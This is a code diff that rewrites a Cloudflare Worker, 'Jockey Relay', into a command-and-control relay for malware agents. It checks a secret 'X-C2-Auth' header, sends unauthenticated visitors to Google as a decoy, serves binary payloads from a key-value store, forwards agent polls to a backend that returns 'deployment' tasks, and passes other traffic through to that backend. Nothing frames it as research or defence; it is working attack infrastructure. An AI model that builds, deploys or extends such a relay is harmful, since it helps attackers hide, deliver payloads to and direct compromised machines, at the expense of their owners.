@@ -1,39 +1,86 @@
+// ============================================================================
+// Jockey Relay ? Cloudflare Worker (short-poll, no loop)
+// ============================================================================
+
+const DECOY_URL = "https://www.google.com";
+
 export default {
   async fetch(request, env) {
-    // ============================================================
-    // 1. Check the auth header – only agents with the secret can pass
-    // ============================================================
     const authHeader = request.headers.get("X-C2-Auth");
     if (authHeader !== env.C2_AUTH) {
-      // Invalid auth → return decoy (302 redirect to Google)
       return new Response(null, {
         status: 302,
-        headers: { "Location": "https://www.google.com" },
+        headers: { "Location": DECOY_URL },
       });
     }
 
-    // ============================================================
-    // 2. Forward the request to your Render manager
-    // ============================================================
-    const url = new URL(request.url);
-    const backendUrl = env.BACKEND_URL + url.pathname + url.search;
+    const url  = new URL(request.url);
+    const path = url.pathname;
 
-    // Preserve the original request but change the destination
-    const modifiedRequest = new Request(backendUrl, {
-      method: request.method,
-      headers: request.headers,
-      body: request.body,
-    });
-
-    // ============================================================
-    // 3. Forward and return the response
-    // ============================================================
-    try {
-      const response = await fetch(modifiedRequest);
-      return response;
-    } catch (error) {
-      console.error("Backend error:", error);
-      return new Response("Backend C2 Unavailable", { status: 503 });
+    // ---- Payloads ----
+    if (path.startsWith("/payloads/")) {
+      const name = path.replace("/payloads/", "");
+      const payload = await env.PAYLOAD_KV.get(name, { type: "arrayBuffer" });
+      if (!payload) return new Response("Not found", { status: 404 });
+      return new Response(payload, {
+        headers: {
+          "Content-Type": "application/octet-stream",
+          "Cache-Control": "no-store",
+        },
+      });
     }
+
+    // ---- Agent poll ? single forward to backend /heartbeat ----
+    if (path === "/api/v1/agent/poll" && request.method === "POST") {
+      let body;
+      try { body = await request.json(); }
+      catch { return json({ error: "invalid json" }, 400); }
+
+      const agentId = body.agent_id;
+      if (!agentId) return json({ error: "agent_id required" }, 400);
+
+      try {
+        const resp = await fetch(`${env.BACKEND_URL}/api/v1/agent/heartbeat`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-C2-Auth":     request.headers.get("X-C2-Auth") || "",
+          },
+          body: JSON.stringify({ agent_id: agentId }),
+        });
+
+        if (!resp.ok) {
+          return new Response(resp.body, {
+            status: resp.status,
+            headers: { "Content-Type": "application/json" },
+          });
+        }
+
+        const data = await resp.json();
+        if (data && data.deployment) {
+          return json({ status: "ok", deployment: data.deployment }, 200);
+        }
+        return json({ status: "idle" }, 200);
+
+      } catch (e) {
+        return json({ error: "backend unreachable", detail: String(e) }, 503);
+      }
+    }
+
+    // ---- Pass-through ----
+    const backendUrl = env.BACKEND_URL + url.pathname + url.search;
+    const init = { method: request.method, headers: request.headers };
+    if (!["GET", "HEAD"].includes(request.method)) {
+      init.body = request.body;
+    }
+    try { return await fetch(backendUrl, init); }
+    catch { return json({ error: "backend unavailable" }, 503); }
   },
 };
+
+function json(obj, status = 200) {
+  return new Response(JSON.stringify(obj), {
+    status,
+    headers: { "Content-Type": "application/json" },
+  });
+}
